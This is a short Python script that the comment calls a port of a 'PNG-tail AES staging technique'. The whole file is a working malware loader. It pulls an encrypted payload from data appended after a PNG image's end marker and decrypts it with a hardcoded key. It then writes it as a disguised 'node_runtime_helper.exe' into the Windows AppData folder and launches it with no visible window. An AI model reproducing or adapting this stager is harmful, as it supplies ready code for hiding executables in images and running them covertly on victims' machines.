import hashlib
import os
import subprocess
import sys
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7

# Representative Python port of the documented PNG-tail AES staging technique.
image = Path(sys.argv[1]).read_bytes()
marker = b'IEND\xae\x42\x60\x82'
position = image.rfind(b'IEND\xae\x42\x60\x82')
if position < 0:
    raise ValueError('invalid carrier')
eof = position + len(marker)
trailer = image[eof:]
key = hashlib.sha256(b'malfexteam2027').digest()
cipher = Cipher(algorithms.AES(key), modes.CBC(trailer[:16]))
decoder = cipher.decryptor()
padded = decoder.update(trailer[16:]) + decoder.finalize()
unpadder = PKCS7(128).unpadder()
executable = unpadder.update(padded) + unpadder.finalize()
destination = Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'node_runtime_helper.exe'
destination.parent.mkdir(parents=True, exist_ok=True)
destination.write_bytes(executable)
subprocess.Popen([str(destination)], creationflags=subprocess.CREATE_NO_WINDOW,
                 stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
